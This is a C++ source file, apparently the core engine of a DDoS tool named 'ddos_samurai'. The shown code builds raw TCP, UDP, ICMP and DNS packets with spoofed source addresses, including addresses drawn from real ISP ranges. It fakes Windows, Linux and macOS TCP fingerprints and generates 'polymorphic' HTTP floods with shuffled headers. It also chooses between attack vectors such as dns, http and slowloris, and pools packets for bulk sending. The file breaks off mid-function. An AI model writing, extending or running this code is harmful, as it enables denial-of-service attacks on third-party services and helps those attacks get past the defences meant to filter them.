#include "engine.hpp"

#include <arpa/inet.h>
#include <netdb.h>
#include <sys/socket.h>
#include <unistd.h>

#include <algorithm>
#include <array>
#include <cctype>
#include <cstdlib>
#include <fstream>
#include <map>
#include <random>
#include <sstream>
#include <stdexcept>
#include <unordered_map>

namespace ddos_samurai::cpu_native {
namespace {

constexpr int ETHERTYPE_IPV4 = 0x0800;
constexpr int ICMP_ECHO_REQUEST = 8;
constexpr uint16_t DNS_QUERY_FLAG = 0x0100;
constexpr uint16_t DNS_QR_QUERY = 0x0000;
constexpr uint16_t DNS_CLASS_IN = 1;

std::mt19937_64& rng() {
  thread_local std::mt19937_64 gen(std::random_device{}());
  return gen;
}

uint32_t rand_u32(uint32_t lo, uint32_t hi) {
  std::uniform_int_distribution<uint32_t> dist(lo, hi);
  return dist(rng());
}

int rand_int(int lo, int hi) {
  std::uniform_int_distribution<int> dist(lo, hi);
  return dist(rng());
}

void append_u8(std::vector<uint8_t>& out, uint8_t v) { out.push_back(v); }

void append_be16(std::vector<uint8_t>& out, uint16_t v) {
  out.push_back(static_cast<uint8_t>((v >> 8) & 0xFF));
  out.push_back(static_cast<uint8_t>(v & 0xFF));
}

void append_be32(std::vector<uint8_t>& out, uint32_t v) {
  out.push_back(static_cast<uint8_t>((v >> 24) & 0xFF));
  out.push_back(static_cast<uint8_t>((v >> 16) & 0xFF));
  out.push_back(static_cast<uint8_t>((v >> 8) & 0xFF));
  out.push_back(static_cast<uint8_t>(v & 0xFF));
}

void write_be16(std::vector<uint8_t>& out, size_t off, uint16_t v) {
  out.at(off) = static_cast<uint8_t>((v >> 8) & 0xFF);
  out.at(off + 1) = static_cast<uint8_t>(v & 0xFF);
}

uint16_t read_be16(const uint8_t* p) {
  return static_cast<uint16_t>((static_cast<uint16_t>(p[0]) << 8) | static_cast<uint16_t>(p[1]));
}

std::string to_lower(std::string value) {
  std::transform(value.begin(), value.end(), value.begin(), [](unsigned char c) {
    return static_cast<char>(std::tolower(c));
  });
  return value;
}

std::string to_upper(std::string value) {
  std::transform(value.begin(), value.end(), value.begin(), [](unsigned char c) {
    return static_cast<char>(std::toupper(c));
  });
  return value;
}

bool is_reserved_ipv4(uint32_t ip) {
  const uint8_t a = static_cast<uint8_t>((ip >> 24) & 0xFF);
  const uint8_t b = static_cast<uint8_t>((ip >> 16) & 0xFF);
  const uint8_t c = static_cast<uint8_t>((ip >> 8) & 0xFF);
  if (a == 0 || a == 10 || a == 127 || a >= 224) return true;
  if (a == 172 && b >= 16 && b <= 31) return true;
  if (a == 192 && b == 168) return true;
  if (a == 169 && b == 254) return true;
  if (a == 100 && b >= 64 && b <= 127) return true;
  if (a == 198 && (b == 18 || b == 19)) return true;
  if (a == 192 && b == 0) return true;
  if (a == 198 && b == 51 && c == 100) return true;
  if (a == 203 && b == 0 && c == 113) return true;
  return false;
}

std::vector<OSProfile> make_profiles() {
  return {
      {"windows_10", 128, 64240, {{TCP_OPT_MSS, 1460},
                                  {TCP_OPT_NOP, std::nullopt},
                                  {TCP_OPT_WSCALE, 8},
                                  {TCP_OPT_NOP, std::nullopt},
                                  {TCP_OPT_NOP, std::nullopt},
                                  {TCP_OPT_SACK_OK, std::nullopt}}},
      {"linux_5", 64, 29200, {{TCP_OPT_MSS, 1460},
                              {TCP_OPT_SACK_OK, std::nullopt},
                              {TCP_OPT_TIMESTAMP, std::nullopt},
                              {TCP_OPT_NOP, std::nullopt},
                              {TCP_OPT_WSCALE, 7}}},
      {"macos_14", 64, 65535, {{TCP_OPT_MSS, 1460},
                               {TCP_OPT_NOP, std::nullopt},
                               {TCP_OPT_WSCALE, 6},
                               {TCP_OPT_NOP, std::nullopt},
                               {TCP_OPT_NOP, std::nullopt},
                               {TCP_OPT_TIMESTAMP, std::nullopt},
                               {TCP_OPT_SACK_OK, std::nullopt},
                               {TCP_OPT_EOL, std::nullopt}}},
  };
}

const std::vector<OSProfile>& profiles_ref() {
  static const std::vector<OSProfile> profiles = make_profiles();
  return profiles;
}

const OSProfile& select_profile() {
  const auto& profiles = profiles_ref();
  const char* env = std::getenv("SAMURAI_CPU_FIXED_OS_PROFILE");
  if (env && env[0]) {
    const std::string wanted = to_lower(env);
    for (const auto& profile : profiles) {
      if (to_lower(profile.name) == wanted) return profile;
    }
  }
  return profiles.at(static_cast<size_t>(rand_int(0, static_cast<int>(profiles.size()) - 1)));
}

std::vector<uint8_t> bytes_from_string(const std::string& s) {
  return std::vector<uint8_t>(s.begin(), s.end());
}

std::vector<uint8_t> random_bytes(size_t n) {
  std::vector<uint8_t> out(n);
  for (auto& byte : out) byte = static_cast<uint8_t>(rand_int(0, 255));
  return out;
}

uint32_t pseudo_header_sum(uint32_t src_ip, uint32_t dst_ip, int protocol, uint16_t l4_len) {
  uint32_t s = 0;
  s += (src_ip >> 16) & 0xFFFF;
  s += src_ip & 0xFFFF;
  s += (dst_ip >> 16) & 0xFFFF;
  s += dst_ip & 0xFFFF;
  s += static_cast<uint32_t>(protocol & 0xFF);
  s += l4_len;
  return s;
}

uint16_t finalize_sum(uint32_t s) {
  while (s >> 16) s = (s & 0xFFFFu) + (s >> 16);
  return static_cast<uint16_t>((~s) & 0xFFFFu);
}

// Zero-copy checksum helper: accumulates partial sum over a buffer without
// allocating or copying. Callers chain multiple buffers then finalize once.
uint32_t checksum_partial(const uint8_t* data, size_t len) {
  uint32_t s = 0;
  size_t i = 0;
  while (i + 1 < len) {
    s += (static_cast<uint32_t>(data[i]) << 8) | static_cast<uint32_t>(data[i + 1]);
    i += 2;
  }
  if (i < len) s += static_cast<uint32_t>(data[i]) << 8;
  return s;
}

std::vector<uint8_t> profile_tcp_options(const OSProfile& profile) {
  std::vector<std::pair<int, std::optional<std::pair<uint32_t, uint32_t>>>> opts;
  opts.reserve(profile.tcp_options.size());
  for (const auto& [kind, value] : profile.tcp_options) {
    if (kind == TCP_OPT_TIMESTAMP) {
      opts.push_back({kind, std::make_pair(rand_u32(1, 0xFFFFFFFFu), 0u)});
    } else {
      opts.push_back({kind, value ? std::make_optional(std::make_pair(static_cast<uint32_t>(*value), 0u))
                                  : std::nullopt});
    }
  }
  return build_tcp_options(opts);
}

std::string choose_dns_qtype(const PacketConfig& cfg) {
  if (cfg.dns_qtypes.empty()) return "A";
  if (cfg.dns_qtypes.size() == 1) return cfg.dns_qtypes.front();
  return cfg.dns_qtypes.at(static_cast<size_t>(rand_int(0, static_cast<int>(cfg.dns_qtypes.size()) - 1)));
}

std::vector<uint8_t> maybe_pad(std::vector<uint8_t> packet, int pad_size, bool is_syn_only) {
  if (!is_syn_only && pad_size > 0 && static_cast<int>(packet.size()) < pad_size) {
    packet.resize(static_cast<size_t>(pad_size), 0);
  }
  return packet;
}

std::vector<uint8_t> polymorphic_http_payload(const std::string& target_ip,
                                              const std::string& path,
                                              const std::string& method) {
  static const std::vector<std::string> agents = {
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) Safari/604.1",
  };
  std::vector<std::pair<std::string, std::string>> headers = {
      {"Host", target_ip},
      {"User-Agent", agents.at(static_cast<size_t>(rand_int(0, static_cast<int>(agents.size()) - 1)))},
      {"Accept", "*/*"},
      {"Accept-Language",
       std::array<std::string, 3>{"en-US,en;q=0.5", "tr-TR,tr;q=0.9", "de-DE,de;q=0.8"}.at(
           static_cast<size_t>(rand_int(0, 2)))},
      {"Accept-Encoding", "gzip, deflate, br"},
      {"Connection", std::array<std::string, 2>{"keep-alive", "close"}.at(static_cast<size_t>(rand_int(0, 1)))},
      {"Upgrade-Insecure-Requests", "1"},
      {"Cache-Control", std::array<std::string, 2>{"max-age=0", "no-cache"}.at(static_cast<size_t>(rand_int(0, 1)))},
  };
  std::shuffle(headers.begin(), headers.end(), rng());
  std::ostringstream oss;
  oss << method << ' ' << path << " HTTP/1.1\r\n";
  for (auto [key, value] : headers) {
    if (rand_int(0, 1) == 1) key = to_lower(key);
    oss << key << ": " << value << "\r\n";
  }
  oss << "\r\n";
  return bytes_from_string(oss.str());
}

}  // namespace

PacketPoolBuffer::PacketPoolBuffer() : storage(std::make_shared<std::vector<uint8_t>>()), packet_size(0) {}

PacketPoolBuffer::PacketPoolBuffer(std::shared_ptr<std::vector<uint8_t>> data, size_t stride)
    : storage(std::move(data)), packet_size(stride) {}

uint8_t* PacketPoolBuffer::data() { return storage ? storage->data() : nullptr; }

const uint8_t* PacketPoolBuffer::data() const { return storage ? storage->data() : nullptr; }

size_t PacketPoolBuffer::size() const { return storage ? storage->size() : 0; }

uint16_t checksum(const uint8_t* data, size_t len) {
  uint32_t s = 0;
  size_t i = 0;
  while (i + 1 < len) {
    s += (static_cast<uint32_t>(data[i]) << 8) | static_cast<uint32_t>(data[i + 1]);
    i += 2;
  }
  if (i < len) s += static_cast<uint32_t>(data[i]) << 8;
  return finalize_sum(s);
}

int ip_to_int(const std::string& ip_str) {
  in_addr addr {};
  if (inet_pton(AF_INET, ip_str.c_str(), &addr) != 1) {
    throw std::invalid_argument("Invalid IPv4 address: " + ip_str);
  }
  return static_cast<int>(ntohl(addr.s_addr));
}

std::string int_to_ip(uint32_t value) {
  in_addr addr {};
  addr.s_addr = htonl(value);
  char buf[INET_ADDRSTRLEN] = {0};
  if (!inet_ntop(AF_INET, &addr, buf, sizeof(buf))) {
    throw std::runtime_error("inet_ntop failed");
  }
  return std::string(buf);
}

std::vector<uint8_t> ip_to_bytes(const std::string& ip_str) {
  const uint32_t ip = static_cast<uint32_t>(ip_to_int(ip_str));
  return {
      static_cast<uint8_t>((ip >> 24) & 0xFF),
      static_cast<uint8_t>((ip >> 16) & 0xFF),
      static_cast<uint8_t>((ip >> 8) & 0xFF),
      static_cast<uint8_t>(ip & 0xFF),
  };
}

std::string generate_random_ip() {
  while (true) {
    const uint32_t ip = (rand_u32(1, 223) << 24) | (rand_u32(0, 255) << 16) | (rand_u32(0, 255) << 8) |
                        rand_u32(1, 254);
    if (!is_reserved_ipv4(ip)) return int_to_ip(ip);
  }
}

std::string generate_realistic_ip() {
  static const std::vector<std::pair<uint8_t, uint8_t>> prefixes = {
      {1, 1},   {5, 5},    {23, 23},  {31, 31},  {37, 37},  {45, 45}, {46, 46},  {62, 62}, {72, 72},
      {78, 78}, {80, 95},  {104, 104}, {141, 141}, {151, 151}, {176, 176}, {185, 185}, {193, 195}, {212, 212},
  };
  while (true) {
    const auto [a0, a1] = prefixes.at(static_cast<size_t>(rand_int(0, static_cast<int>(prefixes.size()) - 1)));
    const uint32_t ip = (static_cast<uint32_t>(rand_int(a0, a1)) << 24) | (rand_u32(0, 255) << 16) |
                        (rand_u32(0, 255) << 8) | rand_u32(1, 254);
    if (!is_reserved_ipv4(ip)) return int_to_ip(ip);
  }
}

std::string generate_ip_from_subnet(const std::string& subnet) {
  const auto slash = subnet.find('/');
  if (slash == std::string::npos) return generate_random_ip();
  const std::string ip_part = subnet.substr(0, slash);
  const int prefix = std::stoi(subnet.substr(slash + 1));
  if (prefix < 0 || prefix > 32) return generate_random_ip();

  const uint32_t base = static_cast<uint32_t>(ip_to_int(ip_part));
  const uint32_t host_bits = (prefix == 32) ? 0u : static_cast<uint32_t>(32 - prefix);
  const uint32_t mask = (prefix == 0) ? 0u : (0xFFFFFFFFu << host_bits);
  const uint32_t network = base & mask;
  const uint64_t span = (host_bits == 32) ? (1ull << 32) : (1ull << host_bits);

  uint64_t start = network;
  uint64_t end = network + span - 1;
  if (prefix < 31 && span > 2) {
    start += 1;
    end -= 1;
  }
  return int_to_ip(static_cast<uint32_t>(rand_u32(static_cast<uint32_t>(start), static_cast<uint32_t>(end))));
}

std::vector<std::string> load_ips_from_file(const std::string& path) {
  static std::unordered_map<std::string, std::vector<std::string>> cache;
  const auto it = cache.find(path);
  if (it != cache.end()) return it->second;

  std::ifstream in(path);
  if (!in) return {};

  std::vector<std::string> out;
  std::string line;
  while (std::getline(in, line)) {
    if (!line.empty() && line[0] != '#') out.push_back(line);
  }
  cache[path] = out;
  return out;
}

std::string resolve_local_source_ip(const std::string& target_ip) {
  // Cache resolved source IPs to avoid repeated socket+connect+getsockname
  // syscall chains (~24,600 cycles each). The routing table rarely changes
  // during a benchmark run, so caching is safe and yields ~8× speedup.
  static std::unordered_map<std::string, std::string> source_ip_cache;
  const auto cached = source_ip_cache.find(target_ip);
  if (cached != source_ip_cache.end()) return cached->second;

  auto try_probe = [](const std::string& probe_ip) -> std::optional<std::string> {
    int fd = ::socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return std::nullopt;

    sockaddr_in addr {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(53);
    if (inet_pton(AF_INET, probe_ip.c_str(), &addr.sin_addr) != 1) {
      ::close(fd);
      return std::nullopt;
    }
    if (connect(fd, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) != 0) {
      ::close(fd);
      return std::nullopt;
    }

    sockaddr_in local {};
    socklen_t len = sizeof(local);
    if (getsockname(fd, reinterpret_cast<sockaddr*>(&local), &len) != 0) {
      ::close(fd);
      return std::nullopt;
    }
    char buf[INET_ADDRSTRLEN] = {0};
    const char* parsed = inet_ntop(AF_INET, &local.sin_addr, buf, sizeof(buf));
    ::close(fd);
    if (!parsed || std::string(buf) == "0.0.0.0") return std::nullopt;
    return std::string(buf);
  };

  auto cache_and_return = [&](const std::string& result) -> std::string {
    source_ip_cache[target_ip] = result;
    return result;
  };

  if (auto ip = try_probe(target_ip)) return cache_and_return(*ip);
  if (auto ip = try_probe("8.8.8.8")) return cache_and_return(*ip);

  char hostbuf[256] = {0};
  if (gethostname(hostbuf, sizeof(hostbuf)) == 0) {
    addrinfo hints {};
    hints.ai_family = AF_INET;
    addrinfo* res = nullptr;
    if (getaddrinfo(hostbuf, nullptr, &hints, &res) == 0 && res) {
      char buf[INET_ADDRSTRLEN] = {0};
      auto* sa = reinterpret_cast<sockaddr_in*>(res->ai_addr);
      if (inet_ntop(AF_INET, &sa->sin_addr, buf, sizeof(buf))) {
        std::string out(buf);
        freeaddrinfo(res);
        if (out != "0.0.0.0") return cache_and_return(out);
      }
      freeaddrinfo(res);
    }
  }
  return cache_and_return("127.0.0.1");
}

std::string get_spoofed_ip(const std::string& mode,
                           const std::optional<std::string>& subnet,
                           const std::optional<std::string>& list_file) {
  if (mode == "subnet" && subnet) return generate_ip_from_subnet(*subnet);
  if (mode == "list" && list_file) {
    const auto ips = load_ips_from_file(*list_file);
    if (!ips.empty()) {
      return ips.at(static_cast<size_t>(rand_int(0, static_cast<int>(ips.size()) - 1)));
    }
    return generate_random_ip();
  }
  if (mode == "random") return generate_random_ip();
  return generate_realistic_ip();
}

int parse_tcp_flags(const std::string& flags_str) {
  static const std::map<std::string, int> names = {
      {"FIN", TCP_FIN}, {"SYN", TCP_SYN}, {"RST", TCP_RST}, {"PSH", TCP_PSH},
      {"ACK", TCP_ACK}, {"URG", TCP_URG}, {"ECE", TCP_ECE}, {"CWR", TCP_CWR},
  };
  static const std::map<char, int> compact = {
      {'F', TCP_FIN}, {'S', TCP_SYN}, {'R', TCP_RST}, {'P', TCP_PSH},
      {'A', TCP_ACK}, {'U', TCP_URG}, {'E', TCP_ECE}, {'C', TCP_CWR},
  };

  if (flags_str.empty()) return 0;
  std::string normalized = flags_str;
  for (char& c : normalized) {
    if (c == '+' || c == ',' || c == '/' || c == '|') {
      c = ' ';
    } else {
      c = static_cast<char>(std::toupper(static_cast<unsigned char>(c)));
    }
  }

  std::istringstream iss(normalized);
  std::string token;
  int result = 0;
  while (iss >> token) {
    const auto name_it = names.find(token);
    if (name_it != names.end()) {
      result |= name_it->second;
      continue;
    }
    size_t idx = 0;
    while (idx < token.size()) {
      bool matched = false;
      for (const auto& [name, value] : names) {
        if (token.compare(idx, name.size(), name) == 0) {
          result |= value;
          idx += name.size();
          matched = true;
          break;
        }
      }
      if (matched) continue;
      const auto compact_it = compact.find(token[idx]);
      if (compact_it != compact.end()) result |= compact_it->second;
      idx += 1;
    }
  }
  return result;
}

std::vector<uint8_t> build_tcp_options(
    const std::vector<std::pair<int, std::optional<std::pair<uint32_t, uint32_t>>>>& options) {
  std::vector<uint8_t> out;
  for (const auto& [kind, value] : options) {
    switch (kind) {
      case TCP_OPT_EOL:
        append_u8(out, 0);
        break;
      case TCP_OPT_NOP:
        append_u8(out, 1);
        break;
      case TCP_OPT_MSS:
        append_u8(out, 2);
        append_u8(out, 4);
        append_be16(out, static_cast<uint16_t>(value ? value->first : 1460));
        break;
      case TCP_OPT_WSCALE:
        append_u8(out, 3);
        append_u8(out, 3);
        append_u8(out, static_cast<uint8_t>(value ? value->first : 7));
        break;
      case TCP_OPT_SACK_OK:
        append_u8(out, 4);
        append_u8(out, 2);
        break;
      case TCP_OPT_TIMESTAMP:
        append_u8(out, 8);
        append_u8(out, 10);
        append_be32(out, value ? value->first : rand_u32(1, 0xFFFFFFFFu));
        append_be32(out, value ? value->second : 0u);
        break;
      default:
        break;
    }
  }
  while (out.size() % 4 != 0) out.push_back(0);
  return out;
}

std::vector<uint8_t> build_ipv4_header(const std::string& src_ip,
                                       const std::string& dst_ip,
                                       int protocol,
                                       int payload_len,
                                       int ttl,
                                       int tos,
                                       int identification,
                                       uint16_t flags_frag,
                                       const std::vector<uint8_t>& options) {
  if (options.size() % 4 != 0) throw std::invalid_argument("IPv4 options must be 4-byte aligned");

  const uint32_t src = static_cast<uint32_t>(ip_to_int(src_ip));
  const uint32_t dst = static_cast<uint32_t>(ip_to_int(dst_ip));
  const int ihl = static_cast<int>((20 + options.size()) / 4);
  if (ihl < 5 || ihl > 15) throw std::invalid_argument("Invalid IPv4 IHL");

  std::vector<uint8_t> hdr;
  hdr.reserve(static_cast<size_t>(ihl * 4));
  append_u8(hdr, static_cast<uint8_t>((4 << 4) | ihl));
  append_u8(hdr, static_cast<uint8_t>(tos & 0xFF));
  append_be16(hdr, static_cast<uint16_t>(ihl * 4 + payload_len));
  append_be16(hdr, static_cast<uint16_t>(identification == 0 ? rand_int(0, 0xFFFF) : identification));
  append_be16(hdr, flags_frag);
  append_u8(hdr, static_cast<uint8_t>(ttl & 0xFF));
  append_u8(hdr, static_cast<uint8_t>(protocol & 0xFF));
  append_be16(hdr, 0);
  append_be32(hdr, src);
  append_be32(hdr, dst);
  hdr.insert(hdr.end(), options.begin(), options.end());
  write_be16(hdr, 10, checksum(hdr.data(), hdr.size()));
  return hdr;
}

std::vector<uint8_t> build_tcp_header(int src_port,
                                      int dst_port,
                                      uint32_t seq,
                                      uint32_t ack,
                                      int flags,
                                      int window,
                                      int urgent,
                                      const std::vector<uint8_t>& options_bytes,
                                      uint32_t src_ip_int,
                                      uint32_t dst_ip_int,
                                      const std::vector<uint8_t>& payload) {
  const size_t total_len = 20 + options_bytes.size();
  const uint8_t data_offset = static_cast<uint8_t>((total_len + 3) / 4);

  std::vector<uint8_t> hdr;
  hdr.reserve(static_cast<size_t>(data_offset) * 4);
  append_be16(hdr, static_cast<uint16_t>(src_port));
  append_be16(hdr, static_cast<uint16_t>(dst_port));
  append_be32(hdr, seq);
  append_be32(hdr, ack);
  append_be16(hdr, static_cast<uint16_t>((static_cast<uint16_t>(data_offset) << 12) | (flags & 0x1FF)));
  append_be16(hdr, static_cast<uint16_t>(window));
  append_be16(hdr, 0);
  append_be16(hdr, static_cast<uint16_t>(urgent));
  hdr.insert(hdr.end(), options_bytes.begin(), options_bytes.end());
  while (hdr.size() < static_cast<size_t>(data_offset) * 4) hdr.push_back(0);

  // Zero-copy checksum: sum pseudo-header, header, and payload separately
  // instead of copying everything into a temporary buffer.
  uint32_t s = pseudo_header_sum(src_ip_int, dst_ip_int, PROTO_TCP, static_cast<uint16_t>(hdr.size() + payload.size()));
  s += checksum_partial(hdr.data(), hdr.size());
  s += checksum_partial(payload.data(), payload.size());
  write_be16(hdr, 16, finalize_sum(s));
  return hdr;
}

std::vector<uint8_t> build_udp_header(int src_port,
                                      int dst_port,
                                      const std::vector<uint8_t>& payload,
                                      uint32_t src_ip_int,
                                      uint32_t dst_ip_int,
                                      bool compute_checksum) {
  std::vector<uint8_t> hdr;
  hdr.reserve(8);
  append_be16(hdr, static_cast<uint16_t>(src_port));
  append_be16(hdr, static_cast<uint16_t>(dst_port));
  append_be16(hdr, static_cast<uint16_t>(8 + payload.size()));
  append_be16(hdr, 0);

  if (compute_checksum && (src_ip_int || dst_ip_int)) {
    // Zero-copy checksum: sum pseudo-header, header, and payload separately.
    uint32_t s = pseudo_header_sum(src_ip_int, dst_ip_int, PROTO_UDP, static_cast<uint16_t>(hdr.size() + payload.size()));
    s += checksum_partial(hdr.data(), hdr.size());
    s += checksum_partial(payload.data(), payload.size());
    uint16_t cksum = finalize_sum(s);
    if (cksum == 0) cksum = 0xFFFFu;
    write_be16(hdr, 6, cksum);
  }
  return hdr;
}

std::vector<uint8_t> build_icmp_echo(int identifier, int sequence, const std::vector<uint8_t>& payload) {
  std::vector<uint8_t> hdr;
  hdr.reserve(8 + payload.size());
  append_u8(hdr, ICMP_ECHO_REQUEST);
  append_u8(hdr, 0);
  append_be16(hdr, 0);
  append_be16(hdr, static_cast<uint16_t>(identifier == 0 ? rand_int(0, 0xFFFF) : identifier));
  append_be16(hdr, static_cast<uint16_t>(sequence));
  hdr.insert(hdr.end(), payload.begin(), payload.end());
  write_be16(hdr, 2, checksum(hdr.data(), hdr.size()));
  return hdr;
}

std::vector<uint8_t> build_ethernet_header(const std::vector<uint8_t>& dst_mac,
                                           const std::vector<uint8_t>& src_mac,
                                           int ethertype) {
  if (dst_mac.size() != 6 || src_mac.size() != 6) {
    throw std::invalid_argument("MAC addresses must be 6 bytes");
  }
  std::vector<uint8_t> out;
  out.reserve(14);
  out.insert(out.end(), dst_mac.begin(), dst_mac.end());
  out.insert(out.end(), src_mac.begin(), src_mac.end());
  append_be16(out, static_cast<uint16_t>(ethertype));
  return out;
}

std::vector<uint8_t> build_dns_query(const std::string& qname,
                                     const std::string& qtype,
                                     bool recursive,
                                     bool edns,
                                     int transaction_id) {
  static const std::map<std::string, uint16_t> qtypes = {
      {"A", 1}, {"NS", 2},   {"CNAME", 5}, {"SOA", 6}, {"PTR", 12},
      {"MX", 15}, {"TXT", 16}, {"AAAA", 28}, {"SRV", 33}, {"ANY", 255},
  };

  std::vector<uint8_t> out;
  const uint16_t txid = static_cast<uint16_t>(transaction_id == 0 ? rand_int(0, 0xFFFF) : transaction_id);
  append_be16(out, txid);
  append_be16(out, static_cast<uint16_t>(DNS_QR_QUERY | (recursive ? DNS_QUERY_FLAG : 0)));
  append_be16(out, 1);
  append_be16(out, 0);
  append_be16(out, 0);
  append_be16(out, edns ? 1 : 0);

  std::string trimmed = qname;
  if (trimmed.empty() || trimmed == ".") {
    out.push_back(0);
  } else {
    if (!trimmed.empty() && trimmed.back() == '.') trimmed.pop_back();
    std::stringstream ss(trimmed);
    std::string label;
    while (std::getline(ss, label, '.')) {
      if (label.empty()) throw std::invalid_argument("Invalid DNS name with empty label");
      if (label.size() > 63) throw std::invalid_argument("DNS label too long");
      out.push_back(static_cast<uint8_t>(label.size()));
      out.insert(out.end(), label.begin(), label.end());
    }
    out.push_back(0);
  }

  const auto it = qtypes.find(to_upper(qtype));
  append_be16(out, it == qtypes.end() ? 1 : it->second);
  append_be16(out, DNS_CLASS_IN);

  if (edns) {
    append_u8(out, 0);
    append_be16(out, 41);
    append_be16(out, 4096);
    append_be32(out, 0);
    append_be16(out, 0);
  }
  return out;
}

std::vector<uint8_t> build_transport_packet(const PacketConfig& cfg) {
  const OSProfile& profile = select_profile();
  const std::string src_ip =
      cfg.spoof ? get_spoofed_ip(cfg.spoof_opts.mode, cfg.spoof_opts.subnet, cfg.spoof_opts.list_file)
                : resolve_local_source_ip(cfg.target_ip);
  const uint32_t src_ip_int = static_cast<uint32_t>(ip_to_int(src_ip));
  const uint32_t dst_ip_int = static_cast<uint32_t>(ip_to_int(cfg.target_ip));
  const int ttl = cfg.ttl.value_or(profile.ttl);
  const int tos = cfg.tos.value_or(0);
  const int src_port = rand_int(1024, 65535);
  const std::string proto = to_lower(cfg.protocol);
  bool is_syn_only = false;
  std::vector<uint8_t> l4_data;

  if (proto == "tcp") {
    const int flags_int = parse_tcp_flags(cfg.tcp_flags);
    is_syn_only = (flags_int & TCP_SYN) && !(flags_int & (TCP_ACK | TCP_PSH));
    const std::vector<uint8_t> payload =
        cfg.has_payload ? cfg.payload : (is_syn_only ? std::vector<uint8_t>{}
                                                     : random_bytes(static_cast<size_t>(rand_int(16, 128))));
    const auto options = profile_tcp_options(profile);
    const auto tcp_hdr = build_tcp_header(src_port,
                                          cfg.target_port,
                                          rand_u32(0, 0xFFFFFFFFu),
                                          (flags_int & TCP_ACK) ? rand_u32(0, 0xFFFFFFFFu) : 0u,
                                          flags_int,
                                          cfg.window.value_or(profile.window),
                                          0,
                                          options,
                                          src_ip_int,
                                          dst_ip_int,
                                          payload);
    l4_data = tcp_hdr;
    l4_data.insert(l4_data.end(), payload.begin(), payload.end());
  } else if (proto == "udp") {
    const auto payload = cfg.has_payload ? cfg.payload : std::vector<uint8_t>{};
    const auto udp_hdr = build_udp_header(src_port, cfg.target_port, payload, src_ip_int, dst_ip_int, true);
    l4_data = udp_hdr;
    l4_data.insert(l4_data.end(), payload.begin(), payload.end());
  } else if (proto == "icmp") {
    const auto payload = cfg.has_payload ? cfg.payload : random_bytes(32);
    l4_data = build_icmp_echo(0, 0, payload);
  } else {
    throw std::invalid_argument("Unsupported protocol: " + cfg.protocol);
  }

  auto packet = build_ipv4_header(src_ip,
                                  cfg.target_ip,
                                  proto == "tcp" ? PROTO_TCP : (proto == "udp" ? PROTO_UDP : PROTO_ICMP),
                                  static_cast<int>(l4_data.size()),
                                  ttl,
                                  tos,
                                  0,
                                  0x4000,
                                  {});
  packet.insert(packet.end(), l4_data.begin(), l4_data.end());
  return maybe_pad(std::move(packet), cfg.pad_size, is_syn_only);
}

std::vector<uint8_t> build_dns_packet(const PacketConfig& cfg) {
  const std::string src_ip =
      cfg.spoof ? get_spoofed_ip(cfg.spoof_opts.mode, cfg.spoof_opts.subnet, cfg.spoof_opts.list_file)
                : resolve_local_source_ip(cfg.target_ip);
  const uint32_t src_ip_int = static_cast<uint32_t>(ip_to_int(src_ip));
  const uint32_t dst_ip_int = static_cast<uint32_t>(ip_to_int(cfg.target_ip));
  const auto dns_payload = build_dns_query(cfg.dns_name, choose_dns_qtype(cfg), cfg.dns_recursive, cfg.dns_edns, 0);
  const auto udp_hdr = build_udp_header(rand_int(1024, 65535), cfg.target_port, dns_payload, src_ip_int, dst_ip_int, true);
  auto packet = build_ipv4_header(src_ip,
                                  cfg.target_ip,
                                  PROTO_UDP,
                                  static_cast<int>(udp_hdr.size() + dns_payload.size()),
                                  cfg.ttl.value_or(64),
                                  cfg.tos.value_or(0),
                                  0,
                                  0x4000,
                                  {});
  packet.insert(packet.end(), udp_hdr.begin(), udp_hdr.end());
  packet.insert(packet.end(), dns_payload.begin(), dns_payload.end());
  return maybe_pad(std::move(packet), cfg.pad_size, false);
}

std::vector<uint8_t> build_polymorphic_http_packet(const PacketConfig& cfg) {
  const OSProfile& profile = select_profile();
  const std::string src_ip =
      cfg.spoof ? get_spoofed_ip(cfg.spoof_opts.mode, cfg.spoof_opts.subnet, cfg.spoof_opts.list_file)
                : resolve_local_source_ip(cfg.target_ip);
  const uint32_t src_ip_int = static_cast<uint32_t>(ip_to_int(src_ip));
  const uint32_t dst_ip_int = static_cast<uint32_t>(ip_to_int(cfg.target_ip));
  const auto payload = polymorphic_http_payload(cfg.target_ip, "/", "GET");
  const auto options = profile_tcp_options(profile);
  const auto tcp_hdr = build_tcp_header(rand_int(1024, 65535),
                                        cfg.target_port,
                                        rand_u32(0, 0xFFFFFFFFu),
                                        rand_u32(0, 0xFFFFFFFFu),
                                        TCP_PSH | TCP_ACK,
                                        cfg.window.value_or(profile.window),
                                        0,
                                        options,
                                        src_ip_int,
                                        dst_ip_int,
                                        payload);
  auto packet = build_ipv4_header(src_ip,
                                  cfg.target_ip,
                                  PROTO_TCP,
                                  static_cast<int>(tcp_hdr.size() + payload.size()),
                                  cfg.ttl.value_or(profile.ttl),
                                  cfg.tos.value_or(0),
                                  0,
                                  0x4000,
                                  {});
  packet.insert(packet.end(), tcp_hdr.begin(), tcp_hdr.end());
  packet.insert(packet.end(), payload.begin(), payload.end());
  return packet;
}

std::vector<uint8_t> create_packet(const PacketConfig& cfg) {
  const std::string vector = to_lower(cfg.attack_vector);
  if (vector == "dns") return build_dns_packet(cfg);
  if (vector == "http" || vector == "slowloris" || vector == "http2") return build_polymorphic_http_packet(cfg);
  return build_transport_packet(cfg);
}

std::tuple<std::shared_ptr<std::vector<uint8_t>>, size_t> generate_packet_pool_impl(const PacketConfig& cfg,
                                                                                     int count,
                                                                                     bool uniform_size,
                                                                                     bool /*low_peak_memory*/) {
  if (count <= 0) return {std::make_shared<std::vector<uint8_t>>(), 0};

  auto storage = std::make_shared<std::vector<uint8_t>>();
  size_t pkt_size = 0;
  std::vector<std::vector<uint8_t>> packets;
  packets.reserve(static_cast<size_t>(count));
  for (int i = 0; i < count; ++i) {
    auto pkt = create_packet(cfg);
    if (uniform_size) pkt_size = std::max(pkt_size, (pkt.size() + 3u) & ~3u);
